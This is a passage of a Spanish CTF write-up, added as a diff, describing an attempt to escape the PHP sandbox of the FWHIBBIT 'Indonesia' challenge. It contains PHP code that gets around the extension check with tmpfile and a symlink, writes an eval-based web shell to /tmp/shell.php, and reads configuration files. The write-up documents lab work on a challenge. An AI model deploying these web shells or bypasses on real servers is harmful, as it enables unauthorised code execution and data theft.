@@ -43,3 +43,85 @@ Para ello utilicé un script en Ruby que nos devuelve la llamada en formato bina
 Construimos el código php con la llamada binaria y obtenemos la flag.
 
 ![](img/8-flag.png)
+
+---
+
+# CTF FWHIBBIT – Impossible is nothing – Indonesia – Parte 2
+
+En esta segunda parte explicaré el proceso que he seguido para intentar, sin exito, evadir las protecciones de la prueba y hacerme con el control de la maquina, o al menos del docker donde se encuentra la prueba.
+
+En el ultimo paso de la solución a la prueba se consiguió ejecutar el archivo PHP en el que se encontraba la flag.
+
+Por tanto, nuestro primer objetivo será ejecutar nuestro propio código, pero a través del CGI.
+
+Para ello voy a simplificar el proceso utilizando directamente la librería/clase *PHP-FastCGI-Client* para comunicarme con el socket de PHP/CGI.
+
+![](img/10-class.png)
+
+Modificando la petición es posible llamar a *ajax.php* para ejecutar cualquier código PHP que se encuentre en la variable *phpcode*.
+
+![](img/11-ajax.png)
+
+De esta forma tampoco es posible evadir las protecciones para ejecutar funciones prohibidas o habilitar el wrapper *file*.
+
+![](img/12-wrappers-fail.png)
+
+Mi siguiente intento fue el de subir mi propio archivo PHP y ejecutarlo, para ello podia utilizar la función *tmpfile* para crear un fichero de nombre aleatorio en el directorio */tmp/* y *fwrite* para escribir en el. Al no tener la extension *.php*, por seguridad, no es posible ejecutar el archivo.
+
+``php
+// Crear archivo temporal
+$data = '<?php phpinfo(); ?>';
+$tmpHandle = tmpfile();
+$metaDatas = stream_get_meta_data($tmpHandle);
+$tmpFilename = $metaDatas['uri'];
+echo $tmpFilename;
+fwrite($tmpHandle, $data);
+```
+
+![](img/13-tmpfile-fail.png)
+
+Para evadir esta protección solo es necesario modificar la extensión del archivo, o mucho mas rápido, crear un enlace simbólico con la extensión php.
+
+```php
+$newphp = '/tmp/pwned.php';
+symlink($tmpFilename, $newphp);
+```
+
+![](img/14-symlink-phpinfo.png)
+
+De esta forma ya tenemos habilitados todos los wrappers y hemos conseguido evadir una de las protecciones.
+
+![](img/15-wrappers-enabled.png)
+
+Para simplificar el proceso y no tener que crear un archivo nuevo cada vez en el directorio */tmp/*, se sube un archivo similar a *ajax.php* con la opción de ejecutar código PHP proveniente de una variable.
+
+```php
+$data = '
+<pre>
+<?php
+    $cod = \'<pre><?php eval(@$_POST["phpcode"]); ?></pre>\';
+    var_dump(file_put_contents(\'/tmp/shell.php\', $cod));
+    readfile(\'/tmp/shell.php\');
+?>
+</pre>
+';
+```
+
+![](img/16-shell.png)
+
+
+A partir de aquí se puede seguir investigando cómodamente, tan solo cambiando el código a ejecutar en la variable $code.
+
+Podemos usar scandir para listar los archivos de un directorio.
+
+![](img/scandir.png)
+
+![](img/scandir-html.png)
+
+También es posible usar readfile para leer archivos de configuración del sistema, o el mismo código fuente de la prueba.
+
+![](img/17-ajax-code.png)
+
+Finalmente no fue posible evadir la protección de funciones deshabilitadas, ni siquiera utilizando un hook con LD_PRELOAD como se explica en el blog de 0verl0ad al estar la función mail deshabilitada.
+
+![](img/15-wrappers-enabled.png)
